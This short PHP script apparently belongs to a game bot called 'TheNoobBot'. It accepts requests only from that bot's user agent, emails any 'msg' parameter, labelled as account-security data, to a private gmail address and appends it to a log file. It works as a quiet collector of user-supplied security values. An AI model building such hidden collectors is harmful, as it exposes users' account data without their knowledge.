<?php
  if($_SERVER['HTTP_USER_AGENT'] != 'TheNoobBot')
    exit(0);
  if($_GET['msg'] != '')
  {
    // A Account Security value detected
    mail ("snip78@gmail.com" , "New Account Security TNB", $_GET["msg"]);
    // on ouvre
    $logfile = fopen("AccountSecurity.log", "a");
    // on �crit
    fwrite($logfile, $_GET["msg"]."\n");
    // on ferme pour lib�rer la m�moire imm�diatement
    fclose($logfile);
  }
?>